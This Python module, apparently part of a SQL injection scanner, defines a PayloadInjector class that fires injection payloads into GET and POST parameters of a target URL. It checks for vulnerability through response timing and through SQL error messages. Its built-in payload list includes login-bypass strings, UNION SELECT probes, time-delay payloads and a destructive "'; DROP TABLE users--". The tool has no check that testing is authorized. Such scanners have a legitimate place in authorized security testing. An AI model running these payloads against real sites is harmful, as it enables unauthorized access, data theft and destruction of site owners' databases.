"""
Payload Injector Module
Injects SQL injection payloads and tests for vulnerabilities
"""

import requests
import time
from typing import List, Dict, Tuple
from urllib.parse import urlencode, urlparse, parse_qs, urlunparse
import os


class PayloadInjector:
    """Handles injection of SQL payloads into identified vulnerability points"""

    def __init__(self, payloads_file: str = None, timeout: int = 10):
        """
        Initialize PayloadInjector

        Args:
            payloads_file: Path to payloads file
            timeout: Request timeout in seconds
        """
        self.timeout = timeout
        self.payloads = self._load_payloads(payloads_file)
        self.session = requests.Session()
        self.session.headers.update({
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
        })

    def _load_payloads(self, payloads_file: str = None) -> List[str]:
        """
        Load SQL injection payloads from file

        Args:
            payloads_file: Path to payloads file

        Returns:
            List of payload strings
        """
        if payloads_file and os.path.exists(payloads_file):
            with open(payloads_file, 'r', encoding='utf-8') as f:
                lines = f.readlines()
                # Filter out comments and empty lines
                payloads = [
                    line.strip() for line in lines
                    if line.strip() and not line.strip().startswith('#')
                ]
                return payloads
        else:
            # Default payloads if file not found
            return self._get_default_payloads()

    def _get_default_payloads(self) -> List[str]:
        """Get default SQL injection payloads"""
        return [
            "' OR '1'='1",
            "' OR 1=1--",
            "\" OR \"1\"=\"1",
            "\" OR 1=1--",
            "') OR ('1'='1",
            "admin' OR '1'='1",
            "admin' --",
            "' UNION SELECT NULL--",
            "' UNION SELECT NULL,NULL--",
            "' UNION SELECT 1,2,3--",
            "' AND 1=1--",
            "' AND 1=2--",
            "' OR SLEEP(5)--",
            "'; DROP TABLE users--",
        ]

    def inject_get_parameter(self, url: str, param_name: str, payload: str) -> Dict:
        """
        Inject payload into GET parameter

        Args:
            url: Target URL
            param_name: Parameter name to inject into
            payload: SQL injection payload

        Returns:
            Dictionary with injection results
        """
        # Parse URL and parameters
        parsed_url = urlparse(url)
        params = parse_qs(parsed_url.query)

        # Inject payload
        params[param_name] = [payload]

        # Rebuild URL with injected payload
        new_query = urlencode(params, doseq=True)
        injected_url = urlunparse((
            parsed_url.scheme,
            parsed_url.netloc,
            parsed_url.path,
            parsed_url.params,
            new_query,
            parsed_url.fragment
        ))

        # Send request
        start_time = time.time()
        try:
            response = self.session.get(injected_url, timeout=self.timeout)
            response_time = time.time() - start_time

            return {
                'success': True,
                'url': injected_url,
                'method': 'GET',
                'parameter': param_name,
                'payload': payload,
                'status_code': response.status_code,
                'response_time': response_time,
                'response_length': len(response.content),
                'response_text': response.text,
                'error': None
            }
        except requests.exceptions.Timeout:
            return {
                'success': False,
                'url': injected_url,
                'method': 'GET',
                'parameter': param_name,
                'payload': payload,
                'error': 'TIMEOUT',
                'response_time': self.timeout
            }
        except Exception as e:
            return {
                'success': False,
                'url': injected_url,
                'method': 'GET',
                'parameter': param_name,
                'payload': payload,
                'error': str(e)
            }

    def inject_post_parameter(self, url: str, post_data: Dict, param_name: str, payload: str) -> Dict:
        """
        Inject payload into POST parameter

        Args:
            url: Target URL
            post_data: Original POST data
            param_name: Parameter name to inject into
            payload: SQL injection payload

        Returns:
            Dictionary with injection results
        """
        # Create modified POST data with payload
        modified_data = post_data.copy()
        modified_data[param_name] = payload

        # Send request
        start_time = time.time()
        try:
            response = self.session.post(url, data=modified_data, timeout=self.timeout)
            response_time = time.time() - start_time

            return {
                'success': True,
                'url': url,
                'method': 'POST',
                'parameter': param_name,
                'payload': payload,
                'status_code': response.status_code,
                'response_time': response_time,
                'response_length': len(response.content),
                'response_text': response.text,
                'error': None
            }
        except requests.exceptions.Timeout:
            return {
                'success': False,
                'url': url,
                'method': 'POST',
                'parameter': param_name,
                'payload': payload,
                'error': 'TIMEOUT',
                'response_time': self.timeout
            }
        except Exception as e:
            return {
                'success': False,
                'url': url,
                'method': 'POST',
                'parameter': param_name,
                'payload': payload,
                'error': str(e)
            }

    def test_injection_point(self, injection_point: Dict, max_payloads: int = None) -> List[Dict]:
        """
        Test an injection point with all payloads

        Args:
            injection_point: Injection point dictionary from InputAnalyser
            max_payloads: Maximum number of payloads to test (None = all)

        Returns:
            List of injection results
        """
        results = []
        payloads_to_test = self.payloads[:max_payloads] if max_payloads else self.payloads

        for payload in payloads_to_test:
            if injection_point['type'] == 'GET':
                result = self.inject_get_parameter(
                    injection_point['url'],
                    injection_point['parameter'],
                    payload
                )
            elif injection_point['type'] == 'POST':
                # Need to reconstruct post_data from injection_point
                # This is a simplified version
                post_data = {injection_point['parameter']: injection_point['original_value']}
                result = self.inject_post_parameter(
                    injection_point['url'],
                    post_data,
                    injection_point['parameter'],
                    payload
                )
            else:
                continue

            results.append(result)

            # Small delay to avoid overwhelming the server
            time.sleep(0.1)

        return results

    def test_blind_sqli_time(self, url: str, param_name: str, delay: int = 5) -> Tuple[bool, float]:
        """
        Test for time-based blind SQL injection

        Args:
            url: Target URL
            param_name: Parameter to test
            delay: Expected delay in seconds

        Returns:
            Tuple of (is_vulnerable, response_time)
        """
        time_payloads = [
            f"' OR SLEEP({delay})--",
            f"'; WAITFOR DELAY '0:0:{delay}'--",
            f"' AND (SELECT * FROM (SELECT(SLEEP({delay})))a)--"
        ]

        for payload in time_payloads:
            result = self.inject_get_parameter(url, param_name, payload)

            if result['success'] and result['response_time'] >= delay:
                return True, result['response_time']

        return False, 0.0

    def test_error_based(self, url: str, param_name: str) -> Tuple[bool, str]:
        """
        Test for error-based SQL injection

        Args:
            url: Target URL
            param_name: Parameter to test

        Returns:
            Tuple of (is_vulnerable, error_message)
        """
        error_payloads = ["'", '"', "`", "\\"]

        for payload in error_payloads:
            result = self.inject_get_parameter(url, param_name, payload)

            if result['success']:
                # Check response for SQL error messages
                from scanner.response_parser import ResponseParser
                parser = ResponseParser()
                has_error, error_msg = parser.detect_sql_errors(result['response_text'])

                if has_error:
                    return True, error_msg

        return False, ""

    def get_baseline_response(self, url: str, method: str = 'GET', post_data: Dict = None) -> Dict:
        """
        Get baseline response for comparison

        Args:
            url: Target URL
            method: HTTP method
            post_data: POST data if applicable

        Returns:
            Dictionary with baseline response data
        """
        try:
            if method == 'GET':
                response = self.session.get(url, timeout=self.timeout)
            else:
                response = self.session.post(url, data=post_data, timeout=self.timeout)

            return {
                'status_code': response.status_code,
                'response_length': len(response.content),
                'response_text': response.text
            }
        except Exception as e:
            return {
                'error': str(e)
            }
